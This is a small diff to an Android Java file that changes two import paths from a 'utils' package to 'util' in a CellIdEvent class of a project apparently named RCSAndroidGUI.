@@ -12,8 +12,8 @@ import android.util.Log;
 import com.ht.RCSAndroidGUI.CellInfo;
 import com.ht.RCSAndroidGUI.Device;
 import com.ht.RCSAndroidGUI.Status;
-import com.ht.RCSAndroidGUI.utils.Check;
-import com.ht.RCSAndroidGUI.utils.DataBuffer;
+import com.ht.RCSAndroidGUI.util.Check;
+import com.ht.RCSAndroidGUI.util.DataBuffer;
 
 public class CellIdEvent extends EventBase {
 	private static final String TAG = null;
